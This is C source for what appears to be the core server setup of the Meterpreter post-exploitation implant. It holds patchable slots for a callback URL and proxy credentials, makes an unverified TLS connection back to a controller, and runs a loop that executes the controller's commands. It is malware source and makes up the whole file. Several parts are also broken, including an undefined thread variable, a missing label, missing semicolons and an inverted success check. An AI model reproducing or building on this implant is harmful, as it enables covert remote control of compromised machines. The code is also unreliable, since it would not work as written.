/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"

wchar_t *global_meterpreter_transport =
	"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
wchar_t *global_meterpreter_url =
	"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
wchar_t *global_meterpreter_ua =
	"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
wchar_t *global_meterpreter_proxy =
	"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
wchar_t *global_meterpreter_proxy_username =
	"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
wchar_t *global_meterpreter_proxy_password =
	"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
int global_expiration_timeout = 0xb64be661;
int global_comm_timeout = 0xaf79257f;

#define SetHandleInformation(a, b, c)
const unsigned int hAppInstance = 0x504b5320;	// 'PKS '

/*! @brief An array of locks for use by OpenSSL. */
static LOCK **ssl_locks = NULL;

/*!
 * @brief A callback function used by OpenSSL to leverage native system locks.
 * @param mode The lock mode to set.
 * @param type The lock type to operate on.
 * @param file Unused.
 * @param line Unused.
 */
static void server_locking_callback(int mode, int type, const char *file, int line)
{
	if (mode & CRYPTO_LOCK) {
		lock_acquire(ssl_locks[type]);
	} else {
		lock_release(ssl_locks[type]);
	}
}

/*!
 * @brief A callback function used by OpenSSL to get the current threads id.
 * @returns The current thread ID.
 * @remarks While not needed on windows this must be used for posix meterpreter.
 */
static long unsigned int server_threadid_callback(void)
{
	return pthread_self();
}

/*
 * Callback function for dynamic lock creation for OpenSSL.
 */
static struct CRYPTO_dynlock_value *server_dynamiclock_create(const char *file, int line)
{
	return (struct CRYPTO_dynlock_value *)lock_create();
}

/*
 * Callback function for dynamic lock locking for OpenSSL.
 */
static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, const char *file,
	int line)
{
	LOCK *lock = (LOCK *) l;
	if (mode & CRYPTO_LOCK) {
		lock_acquire(lock);
	} else {
		lock_release(lock);
	}
}

/*
 * Callback function for dynamic lock destruction for OpenSSL.
 */
static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value *l, const char *file, int line)
{
	lock_destroy((LOCK *) l);
}

/*
 * Flush all pending data on the connected socket before doing SSL.
 */
static void server_socket_flush(Remote * remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	fd_set fdread;
	DWORD ret;
	char buff[4096];
	lock_acquire(remote->lock);

	while (1) {
		struct timeval tv;
		LONG data;
		FD_ZERO(&fdread);
		FD_SET(ctx->fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec = 1;
		tv.tv_usec = 0;
		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
		if (data == 0)
			break;

		ret = recv(ctx->fd, buff, sizeof(buff), 0);
		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);

		// The socket closed while we waited
		if (ret == 0) {
			break;
		}
	}
	lock_release(remote->lock);
}

/*
 * Poll a socket for data to recv and block when none available.
 */
static LONG server_socket_poll(Remote * remote, long timeout)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	struct timeval tv;
	LONG result;
	fd_set fdread;

	lock_acquire(remote->lock);
	FD_ZERO(&fdread);
	FD_SET(ctx->fd, &fdread);
	tv.tv_sec = 0;
	tv.tv_usec = timeout;
	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);

	if (result == -1 &&
	    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
		result = 0;

	lock_release(remote->lock);
	return result;
}

/*
 * Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
 */
static int server_initialize_ssl(Remote * remote)
{
	int i;

	lock_acquire(remote->lock);

	// Begin to bring up the OpenSSL subsystem...
	CRYPTO_malloc_init();
	SSL_load_error_strings();
	SSL_library_init();

	// Setup the required OpenSSL multi-threaded enviroment...
	ssl_locks = malloc(CRYPTO_num_locks() * sizeof(LOCK *));
	if (ssl_locks == NULL) {
		lock_release(remote->lock);
		return -1;
	}

	for (i = 0; i < CRYPTO_num_locks(); i++)
		ssl_locks[i] = lock_create();

	CRYPTO_set_id_callback(server_threadid_callback);
	CRYPTO_set_locking_callback(server_locking_callback);
	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);
	lock_release(remote->lock);

	return 0;
}

/*
 * Bring down the OpenSSL subsystem
 */
void server_destroy_ssl(Remote * remote)
{
	TcpTransportContext* ctx = NULL;
	int i;

	if (remote) {
		dprintf("[SERVER] Destroying SSL");
		lock_acquire(remote->lock);
		if (remote->transport && remote->transport->ctx) {
			ctx = (TcpTransportContext*)remote->transport->ctx;
			SSL_free(ctx->ssl);
			SSL_CTX_free(ctx->ctx);
		}
		CRYPTO_set_locking_callback(NULL);
		CRYPTO_set_id_callback(NULL);
		CRYPTO_set_dynlock_create_callback(NULL);
		CRYPTO_set_dynlock_lock_callback(NULL);
		CRYPTO_set_dynlock_destroy_callback(NULL);

		for (i = 0; i < CRYPTO_num_locks(); i++)
			lock_destroy(ssl_locks[i]);

		free(ssl_locks);
		lock_release(remote->lock);
	}
}

/*
 * Negotiate SSL on the socket.
 */
static BOOL server_negotiate_ssl(Remote * remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	BOOL success = TRUE;
	DWORD ret = 0;
	DWORD res = 0;
	lock_acquire(remote->lock);

	ctx->meth = TLSv1_client_method();
	ctx->ctx = SSL_CTX_new(ctx->meth);
	SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
	ctx->ssl = SSL_new(ctx->ctx);
	SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
	if (SSL_set_fd(ctx->ssl, ctx->fd) == 0) {
		dprintf("[SERVER] set fd failed");
		success = FALSE;
		goto out;
	}

	do {
		if ((ret = SSL_connect(ctx->ssl)) != 1) {
			res = SSL_get_error(ctx->ssl, ret);
			dprintf("[SERVER] connect failed %d\n", res);
			if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE) {

				// Catch non-blocking socket errors and retry
				continue;
			}
			success = FALSE;
			break;
		}
	} while (ret != 1);

	if (success == FALSE)
		goto out;

	dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
	if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0) {
		dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret,
			SSL_get_error(ctx->ssl, ret));
	}

out:
	lock_release(remote->lock);
	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
	if (ret < 0)
		success = FALSE;
	return success;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using SSL over TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch(Remote * remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet *packet = NULL;
	THREAD *cpt = NULL;
	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS) {
		return result;
	}
	while (running) {
		if (event_poll(dispatchThread->sigterm, 0)) {
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}
		result = server_socket_poll(remote, 100);
		if (result > 0) {
			result = remote->transport->packet_receive(remote, &packet);
			if (result != ERROR_SUCCESS) {
				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}
			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
		}

		else if (result < 0) {
			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[DISPATCH] calling scheduler_destroy...")
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...")
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");
	return result;
}

BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;

	// assume that we have been given a valid socket given that there's no stageless information
	ctx->fd = socket;

	// Do not allow the file descriptor to be inherited by child processes
	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);

	dprintf("[SERVER] Flushing the socket handle...");
	server_socket_flush(remote);

	dprintf("[SERVER] Initializing SSL...");
	if (!server_initialize_ssl(remote))
	{
		return FALSE;
	}

	dprintf("[SERVER] Negotiating SSL...");
	if (!server_negotiate_ssl(remote))
	{
		return FALSE;
	}

	return TRUE;
}

BOOL transport_create(Remote* remote)
{
	wchar_t* transport = remote->pNextTransportType;
	wchar_t* url = remote->pNextTransportUrl;

	dprintf("[TRANSPORT] Type = %S", transport);
	dprintf("[TRANSPORT] URL = %S", url);

	remote->transport = (Transport*)malloc(sizeof(Transport));
	memset(remote->transport, 0, sizeof(Transport));

	remote->transport->url = url;

	if (wcscmp(transport, L"TRANSPORT_SSL") == 0)
	{
		TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));

		memset(ctx, 0, sizeof(TcpTransportContext));

		remote->transport->packet_receive = packet_receive_via_ssl;
		remote->transport->packet_transmit = packet_transmit_via_ssl;
		remote->transport->transport_init = configure_tcp_connection;
		remote->transport->transport_deinit = server_destroy_ssl;
		remote->transport->server_dispatch = server_dispatch;
		remote->transport->get_socket = tcp_transport_get_socket;
		remote->transport->ctx = ctx;
		remote->transport->type = METERPRETER_TRANSPORT_SSL;
	}
	else // TODO: add more transports over time
	{
		dprintf("[SETUP] Not supported");
		return FALSE;
	}

	return TRUE;
}

/*
 * Setup and run the server. This is called from Init via the loader.
 */
DWORD server_setup(SOCKET fd)
{
	THREAD * dispatchThread = NULL;
	Remote *remote = NULL;
	char cStationName[256] = { 0 };
	char cDesktopName[256] = { 0 };
	DWORD res = 0;

	dprintf("[SERVER] Initializing...");
	int local_error = 0;

	srand(time(NULL));

	dprintf("[SERVER] module loaded at 0x%08X", hAppInstance);

	// Open a THREAD item for the servers main thread, we use this to manage migration later.
	dispatchThread = thread_open();
	dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X",
		dispatchThread->handle, dispatchThread->id, dispatchThread->sigterm);

	if (!(remote = remote_allocate())) {
		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
		goto out;
	}

	// Store our thread handle
	remote->hServerThread = dispatchThread->handle;

	dprintf("[SERVER] Registering dispatch routines...");
	register_dispatch_routines();

	// allocate the "next transport" information
	remote->pNextTransportType = _wcsdup(global_meterpreter_transport + 12);
	remote->pNextTransportUrl = _wcsdup(global_meterpreter_url);

	while (remote->pNextTransportType && remote->pNextTransportUrl) {
		dprintf("[SERVER] creating transport");
		if (!transport_create(remote)) {
			break;
		}

		dprintf("[SERVER] initialising transport 0x%p", remote->transport->transport_init);
		if (remote->transport->transport_init && !remote->transport->transport_init(remote, fd)) {
			break;
		}

		// clear out the transport details, they'll be added elsewhere if the
		// transport needs to be hotswapped
		free(remote->pNextTransportType);
		free(remote->pNextTransportUrl);
		remote->pNextTransportType = NULL;
		remote->pNextTransportUrl = NULL;

		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
		remote->transport->server_dispatch(remote, serverThread);

		if (remote->transport->transport_deinit) {
			remote->transport->transport_deinit(remote);
		}

		free(remote->transport);
		remote->transport = NULL;
	}

	dprintf("[SERVER] Deregistering dispatch routines...");
	deregister_dispatch_routines(remote);

	remote_deallocate(remote);

	dprintf("[SERVER] Finished.");
	return res;
}
